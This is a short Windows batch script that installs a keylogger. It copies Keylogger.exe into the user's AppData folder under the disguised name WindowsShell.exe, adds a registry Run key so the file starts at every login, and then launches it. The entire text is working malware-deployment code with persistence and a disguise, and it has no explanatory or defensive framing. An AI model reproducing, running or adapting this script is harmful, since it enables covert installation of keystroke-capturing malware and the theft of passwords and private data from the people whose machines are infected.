@echo off
copy Keylogger.exe "%appdata%\WindowsShell.exe"
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsShell /t REG_SZ /d "%appdata%\WindowsShell.exe" /f
start "" "%appdata%\WindowsShell.exe"